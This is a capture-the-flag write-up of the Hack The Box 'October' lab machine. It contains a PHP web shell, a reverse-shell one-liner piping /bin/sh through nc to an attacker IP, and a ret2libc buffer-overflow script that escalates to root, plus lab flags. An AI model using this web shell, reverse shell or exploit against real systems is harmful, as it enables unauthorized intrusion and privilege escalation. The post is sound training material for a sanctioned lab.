---
layout: single
title: October - Hack The Box
excerpt: "October is a fun medium linux box where're going to upload a php5 reverse shell to win access and to be root we have to exploit a Buffer Overflow."
date: 2023-01-13
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-october/new.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - CMS
  - Buffer Overflow
---

<p align="center">
<img src="/assets/images/htb-writeup-october/october_logo.png">
</p>


October is a fun medium linux box where're going to upload a php5 reverse shell to win access and to be root we have to exploit a Buffer Overflow.Important= Maybe the writeup have errors according me everything is good but I had errors with the file of the writeup sorry if something is wrong I'll fix it.

## Port Scan

The version of ssh it's very old you can use a script to enumerate users of the machine

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-13 17:26 CST
Nmap scan report for 10.10.10.16
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA)
|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)
|   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)
|_  256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Potentially risky methods: PUT PATCH DELETE
|_http-title: October CMS - Vanilla
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

In this machine I don't going to use it

```bash
❯ searchsploit ssh user enumeration
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                      | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                | linux/remote/45210.py
OpenSSH 7.2p2 - Username Enumeration                                                          | linux/remote/40136.py
OpenSSH < 7.7 - User Enumeration (2)                                                          | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                         | linux/remote/40113.txt
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## Enumeration

The web use PHP5 and have something interesting `October CMS - Vanilla`

```bash
❯ whatweb http://10.10.10.16
http://10.10.10.16 [200 OK] Apache[2.4.7], Cookies[october_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], HttpOnly[october_session], IP[10.10.10.16], Meta-Author[October CMS], PHP[5.5.9-1ubuntu4.21], Script, Title[October CMS - Vanilla], X-Powered-By[PHP/5.5.9-1ubuntu4.21]
```

I found this in Google

*A content management system, often abbreviated as CMS, is software that helps users create, manage, and modify content on a website without the need for specialized technical knowledge.*

- [https://kinsta.com/knowledgebase/content-management-system/](https://kinsta.com/knowledgebase/content-management-system/)

This is the webpage

![](/assets/images/htb-writeup-october/web1.png)

Vulnerabilities 

```bash
❯ searchsploit October
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
October CMS - Upload Protection Bypass Code Execution (Metasploit)                            | php/remote/47376.rb
October CMS 1.0.412 - Multiple Vulnerabilities                                                | php/webapps/41936.txt
October CMS < 1.0.431 - Cross-Site Scripting                                                  | php/webapps/44144.txt
October CMS Build 465 - Arbitrary File Read Exploit (Authenticated)                           | php/webapps/49045.sh
October CMS User Plugin 1.4.5 - Persistent Cross-Site Scripting                               | php/webapps/44546.txt
OctoberCMS 1.0.425 (Build 425) - Cross-Site Scripting                                         | php/webapps/42978.txt
OctoberCMS 1.0.426 (Build 426) - Cross-Site Request Forgery                                   | php/webapps/43106.txt
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

If we see the first script we can upload media contents can upload various files on the server. Application prevents the user from uploading PHP code by checking the file extension but *This module exploits an Authenticated user with permission* we don't know any user yet so we can't use it now

In the script I found this information

![](/assets/images/htb-writeup-october/info.png)

if you see there is a route to which it takes us if we click on `menu`

![](/assets/images/htb-writeup-october/info2.png)

But if you click on `menu` the webpage stays loading 

In the webpage said back-end so if you investigate exist a route `backend`

- [https://octobercms.com/forum/post/how-do-i-access-the-backend](https://octobercms.com/forum/post/how-do-i-access-the-backend)

if I write `http://10.10.10.16/backend` takes me to this route and exist a login route

![](/assets/images/htb-writeup-october/login.png)

We can try the credentials we found when we saw the script which were `admin:admin` and works

![](/assets/images/htb-writeup-october/loged.png)

If we click on `Media` we found the file dr.php5 so I think we can upload a file`.php5` to get a reverse shell

![](/assets/images/htb-writeup-october/php5.png)

```bash
❯ /usr/bin/cat cmd.php5
<?php
  echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Now upload the file

![](/assets/images/htb-writeup-october/works.png)

After that click 

![](/assets/images/htb-writeup-october/click.png)

And works

![](/assets/images/htb-writeup-october/www.png)

## Reverse shell

```bash
nc -lvnp 443
listening on [any] 443 ...
```

Now send the reverse shell

```bash
❯ curl http://10.10.10.16/storage/app/media/cmd.php5 --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.21 443 >/tmp/f"
```

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.16] 58834
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$
```

Better shell

```bash
$ python -c 'import pty;pty.spawn("bash")'
www-data@october:/var/www/html/cms/storage/app/media$
Ctrl + Z
❯ stty raw -echo; fg
[1]  + continued  nc -lvnp 443
                              reset xterm
ENTER
www-data@october:/var/www/html/cms/storage/app/media$ export SHELL=bash
www-data@october:/var/www/html/cms/storage/app/media$ export TERM=xterm
```

Now we can read the user flag

```bash
www-data@october:/home/harry$ cat user.txt 
3c0ab4301ddd0d355b74672970ba2279
```

## Buffer Overflow

```bash
www-data@october:/$ find -user root -perm -4000 2>/dev/null
./bin/umount
./bin/ping
./bin/fusermount
./bin/su
./bin/ping6
./bin/mount
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/bin/sudo
./usr/bin/newgrp
./usr/bin/pkexec
./usr/bin/passwd
./usr/bin/chfn
./usr/bin/gpasswd
./usr/bin/traceroute6.iputils
./usr/bin/mtr
./usr/bin/chsh
./usr/sbin/pppd
./usr/local/bin/ovrflw
```

You can exploit pkexec again but I this machine is not the idea the `./usr/local/bin/ovrflw` is the important

if you don't know how buffer overflow works this website is great

- [https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/stack-based-buffer-overflow](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/stack-based-buffer-overflow)

*For me Buffer Overflow is basically for example when in a program the limit for an input is 64bits and you exceed the total buffer size then you start to overwrite registers at system level.*

![/assets/images/htb-writeup-october/buffer.png](/assets/images/htb-writeup-october/buffer.png)

This tool help when you want to understand how buffer overflow works 

- [https://github.com/hugsy/gef](https://github.com/hugsy/gef)

## Process to be Root

```bash
www-data@october:/$ ldd /usr/local/bin/ovrflw
	linux-gate.so.1 =>  (0xb7720000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7566000)
	/lib/ld-linux.so.2 (0x8009d000)
www-data@october:/$
```

Is dynamic 

```bash
www-data@october:/$ for i in $(seq 10); do ldd /usr/local/bin/ovrflw | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
0xb75d1000
0xb7601000
0xb75b8000
0xb75de000
0xb757e000
0xb7605000
0xb75e1000
0xb75ac000
0xb75aa000
0xb762a000
www-data@october:/$
```

## Ret2libc

*The addresses are very small because the machine is a 32 bit machine*

If you copy one address I copy this

```bash
0xb75de000
```

With this we can see that there is a collision

```bash
www-data@october:/$ for i in $(seq 100000); do ldd /usr/local/bin/ovrflw | grep libc | awk 'NF{print $NF}' | tr -d '()'; done | grep "0xb75de000"
0xb75de000
0xb75de000
0xb75de000
0xb75de000
^C
www-data@october:/$
```

```bash
www-data@october:/$ cd /tmp
www-data@october:/tmp$ touch buff.py
```

We need more information to abusse of the buffer overflow we're going to use this

Readelf displays information about one or more ELF format object files. The options control what particular information to display. elffile... are the object files to be examined. 32-bit and 64-bit ELF files are supported, as are archives containing ELF files.

```bash
www-data@october:/tmp$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E " system| exit"
   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
www-data@october:/tmp$
```

This is a python3 script to have a shell with root

```bash
#!/usr/bin/python3

from struct import pack

offset = 112
junk = b"A"*offset 

base_libc_addr = 0xb75d1000
# libc is dinamyc take a dirrection for example I goint to use 0xb75d1000 and exist collision
# www-data@october:/tmp$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E " system| exit"
#   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
#  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
# www-data@october:/tmp$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
# 162bac /bin/sh
# www-data@october:/tmp$  

system_addr_off = 0x00040310
exit_addr_off = 0x00033260 
bin_sh_addr_off = 0x00162bac

system_addr = pack("<L", base_libc_addr + system_addr_off)
exit_addr = pack ("<L", base_libc_addr + exit_addr_off)
bin_sh_addr = pack("<L", base_libc_addr + bin_sh_addr_off)

payload = junk + system_addr + exit_addr + bin_sh_addr
print(payload)
```

And works

```bash
www-data@october:/tmp$ python3 buff.py 
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x10\x13a\xb7`B`\xb7\xac;s\xb7'
# whoami
root
# cat /root/root.txt
90cef5e85f1e0969b4355a3bc2e789fd
#
```


